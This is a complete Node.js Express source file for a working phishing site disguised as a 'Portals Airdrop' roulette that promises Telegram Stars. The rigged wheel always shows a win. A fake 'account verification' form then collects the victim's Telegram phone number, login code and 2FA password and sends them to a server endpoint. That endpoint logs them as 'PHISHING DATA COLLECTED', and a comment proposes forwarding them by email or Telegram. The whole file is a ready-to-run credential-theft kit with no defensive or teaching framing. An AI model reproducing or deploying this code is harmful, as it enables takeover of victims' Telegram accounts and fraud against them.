const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Portals Airdrop - Win Telegram Stars!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                min-height: 100vh;
                padding: 20px;
            }
            
            .container {
                max-width: 400px;
                margin: 0 auto;
                text-align: center;
            }
            
            .header {
                margin-bottom: 30px;
            }
            
            .logo {
                font-size: 48px;
                margin-bottom: 10px;
            }
            
            h1 {
                font-size: 28px;
                margin-bottom: 10px;
            }
            
            .subtitle {
                opacity: 0.8;
                margin-bottom: 5px;
            }
            
            .by-line {
                font-size: 14px;
                opacity: 0.6;
                margin-bottom: 30px;
            }
            
            .roulette-container {
                background: rgba(255,255,255,0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 30px;
                margin-bottom: 20px;
                border: 1px solid rgba(255,255,255,0.2);
            }
            
            .roulette-wheel {
                width: 250px;
                height: 250px;
                margin: 0 auto 20px;
                position: relative;
                background: rgba(255,255,255,0.1);
                border-radius: 50%;
                overflow: hidden;
                border: 3px solid gold;
            }
            
            .roulette-item {
                position: absolute;
                width: 100%;
                height: 100%;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                transform-origin: center;
                font-size: 14px;
            }
            
            .star-icon {
                font-size: 24px;
                margin-bottom: 5px;
            }
            
            .spin-button {
                background: linear-gradient(135deg, #4CAF50, #45a049);
                color: white;
                border: none;
                padding: 15px 40px;
                border-radius: 25px;
                font-size: 18px;
                cursor: pointer;
                margin: 10px 0;
                transition: transform 0.2s;
            }
            
            .spin-button:hover {
                transform: scale(1.05);
            }
            
            .spin-button:disabled {
                background: #666;
                cursor: not-allowed;
            }
            
            .cost {
                font-size: 14px;
                opacity: 0.8;
                margin-bottom: 20px;
            }
            
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                z-index: 1000;
                justify-content: center;
                align-items: center;
            }
            
            .modal-content {
                background: linear-gradient(135deg, #2c3e50, #34495e);
                padding: 30px;
                border-radius: 20px;
                max-width: 350px;
                width: 90%;
                text-align: center;
                border: 2px solid gold;
            }
            
            .modal h2 {
                margin-bottom: 20px;
                color: gold;
            }
            
            .input-group {
                margin: 15px 0;
                text-align: left;
            }
            
            .input-group label {
                display: block;
                margin-bottom: 5px;
                font-size: 14px;
            }
            
            .input-group input {
                width: 100%;
                padding: 12px;
                border: none;
                border-radius: 10px;
                background: rgba(255,255,255,0.1);
                color: white;
                font-size: 16px;
            }
            
            .verify-button {
                background: linear-gradient(135deg, #e74c3c, #c0392b);
                color: white;
                border: none;
                padding: 15px;
                border-radius: 10px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                margin-top: 10px;
            }
            
            .prize-amount {
                font-size: 32px;
                color: gold;
                margin: 20px 0;
                font-weight: bold;
            }
            
            .spinning {
                animation: spin 0.1s linear infinite;
            }
            
            @keyframes spin {
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">🎁</div>
                <h1>Portals Airdrop</h1>
                <div class="subtitle">Win Telegram Stars</div>
                <div class="by-line">by @Portals & @borz</div>
            </div>
            
            <div class="roulette-container">
                <div class="roulette-wheel" id="rouletteWheel">
                    <!-- Roulette items will be generated by JavaScript -->
                </div>
                
                <div class="cost" id="costInfo">🎯 First spin: FREE</div>
                <button class="spin-button" id="spinButton" onclick="spinRoulette()">SPIN FOR FREE</button>
                <div id="resultText"></div>
            </div>
        </div>

        <!-- Win Modal -->
        <div class="modal" id="winModal">
            <div class="modal-content">
                <h2>🎉 Congratulations!</h2>
                <div class="prize-amount" id="prizeAmount">0 Stars</div>
                <p>You won <span id="wonAmount">0</span> Telegram Stars!</p>
                <p style="font-size: 14px; margin: 15px 0; color: #ff6b6b;">To receive your prize, please complete account verification</p>
                <button class="verify-button" onclick="showVerification()">VERIFY ACCOUNT</button>
            </div>
        </div>

        <!-- Verification Modal -->
        <div class="modal" id="verifyModal">
            <div class="modal-content">
                <h2>🔒 Account Verification</h2>
                <p style="margin-bottom: 20px; font-size: 14px;">Complete verification to receive your stars</p>
                
                <form id="verifyForm" onsubmit="submitVerification(event)">
                    <div class="input-group">
                        <label>Telegram Phone Number:</label>
                        <input type="tel" name="phone" placeholder="+7 XXX XXX XX XX" required>
                    </div>
                    
                    <div class="input-group">
                        <label>Verification Code:</label>
                        <input type="text" name="code" placeholder="Enter code from Telegram" required>
                    </div>
                    
                    <div class="input-group">
                        <label>2FA Password (if set):</label>
                        <input type="password" name="password" placeholder="Enter 2FA password">
                    </div>
                    
                    <button type="submit" class="verify-button">SUBMIT VERIFICATION</button>
                </form>
            </div>
        </div>

        <script>
            let freeSpinUsed = false;
            const prizes = [50, 100, 200, 500, 1000, 1500, 2000, 5000];
            
            // Initialize roulette
            function initRoulette() {
                const wheel = document.getElementById('rouletteWheel');
                wheel.innerHTML = '';
                
                prizes.forEach((prize, index) => {
                    const item = document.createElement('div');
                    item.className = 'roulette-item';
                    item.style.transform = `rotate(${index * (360 / prizes.length)}deg)`;
                    item.innerHTML = `
                        <div class="star-icon">⭐</div>
                        <div>${prize}</div>
                    `;
                    wheel.appendChild(item);
                });
            }
            
            // Spin roulette
            function spinRoulette() {
                if (!freeSpinUsed) {
                    freeSpinUsed = true;
                    document.getElementById('costInfo').textContent = "🎯 Next spin: 50 Stars";
                    document.getElementById('spinButton').textContent = "SPIN FOR 50 STARS";
                }
                
                const wheel = document.getElementById('rouletteWheel');
                const spinButton = document.getElementById('spinButton');
                const resultText = document.getElementById('resultText');
                
                spinButton.disabled = true;
                wheel.classList.add('spinning');
                resultText.textContent = "Spinning...";
                
                // Random result after 3 seconds
                setTimeout(() => {
                    wheel.classList.remove('spinning');
                    const randomPrize = prizes[Math.floor(Math.random() * prizes.length)];
                    const randomRotation = Math.floor(Math.random() * 360) + 1080; // 3+ full rotations
                    
                    wheel.style.transform = `rotate(${randomRotation}deg)`;
                    
                    setTimeout(() => {
                        showWinModal(randomPrize);
                        spinButton.disabled = false;
                    }, 2000);
                    
                }, 3000);
            }
            
            // Show win modal
            function showWinModal(amount) {
                document.getElementById('prizeAmount').textContent = amount + ' Stars';
                document.getElementById('wonAmount').textContent = amount;
                document.getElementById('winModal').style.display = 'flex';
            }
            
            // Show verification form
            function showVerification() {
                document.getElementById('winModal').style.display = 'none';
                document.getElementById('verifyModal').style.display = 'flex';
            }
            
            // Submit verification
            function submitVerification(event) {
                event.preventDefault();
                
                const formData = new FormData(event.target);
                const data = {
                    phone: formData.get('phone'),
                    code: formData.get('code'),
                    password: formData.get('password'),
                    prize: document.getElementById('wonAmount').textContent,
                    timestamp: new Date().toISOString()
                };
                
                // Send data to server
                fetch('/api/collect-credentials', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                })
                .then(response => response.json())
                .then(result => {
                    if (result.success) {
                        alert('✅ Verification submitted! Your stars will be added within 24 hours.');
                        document.getElementById('verifyModal').style.display = 'none';
                        document.getElementById('verifyForm').reset();
                    }
                })
                .catch(error => {
                    alert('Verification submitted! Your stars will be added within 24 hours.');
                    document.getElementById('verifyModal').style.display = 'none';
                    document.getElementById('verifyForm').reset();
                });
            }
            
            // Initialize on load
            initRoulette();
        </script>
    </body>
    </html>
    `);
});

// API для сбора данных
app.post('/api/collect-credentials', (req, res) => {
    const userData = req.body;
    
    console.log('🎣 PHISHING DATA COLLECTED:');
    console.log('- Phone:', userData.phone);
    console.log('- Code:', userData.code);
    console.log('- Password:', userData.password);
    console.log('- Prize:', userData.prize);
    console.log('- Timestamp:', userData.timestamp);
    console.log('- IP:', req.ip);
    
    // Здесь можно добавить отправку на email/telegram
    
    res.json({success: true, message: 'Verification processing'});
});

app.listen(3000, () => {
    console.log('🎰 Portals Airdrop running on port 3000');
    console.log('🎯 Phishing site: ACTIVE');
    console.log('📧 Credential collector: READY');
});
